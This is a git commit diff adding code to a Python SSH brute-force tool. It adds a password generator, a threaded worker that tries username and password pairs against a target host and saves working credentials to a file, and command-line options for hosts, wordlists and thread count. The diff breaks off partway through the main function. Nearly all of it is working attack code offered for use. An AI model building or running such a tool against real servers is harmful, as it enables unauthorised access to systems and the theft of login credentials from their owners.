36e3aefb2bc2f93cbb9626ed0afa6a1fbe012a9f
Joseph <joseph.hansjpedronan@gmail.com>
2026-09-11 20:00:42 -0700

    advanced_brute

--- ssh_brute/advanced_brute.py
+++ ssh_brute/advanced_brute.py
@@ -41,3 +41,34 @@ def load_lines(file_path):
     with open(file_path, 'r') as file:
         lines = file.read().splitlines()
     return lines
+
+def generate_passwords(min_length, max_length, chars):
+    for length in range(min_length, max_length + 1):
+        for passwords in itertools.product(chars, repeat=length):
+            yield ''.join(passwords) 
+
+def worker(host):
+    while not q.empty():
+        username, password = q.get()
+        if is_ssh_open(host, username, password):
+            with open('credentials.txt', 'w') as f:
+                f.write(f"{username}@{host}:{password}")
+            q.queue.clear()
+            break
+        q.task_done()
+
+def main():
+    parser = argparse.ArgumentParser(description="SSH Bruteforce.")
+    parser.add_argument('host', help='Hostname or IP address of ssh server.')
+    parser.add_argument('-P', '--passlist', help='Passwords list to bruteforce ssh.')
+    parser.add_argument('-u', '--user', help='Single username to use.')
+    parser.add_argument('-U', '--userlist', help='Usernames list to brutefroce ssh.')
+    parser.add_argument('-g', '--generate', action='store_true', help='Generate passwords on the fly.')
+    parser.add_argument('--min_length', type=int, help='The minimum length to generate passwords.')
+    parser.add_argument('--max_length', type=int, help='The maximum length to generate passwords.')
+    parser.add_argument('-c', '--chars', type=str, help='Characters to use for password generation.')
+    parser.add_argument('-t', '--threads', type=int, help='Number of threads to use')
+
+    args = parser.parse_args()
+    host = args.host
+    threads = args.threads
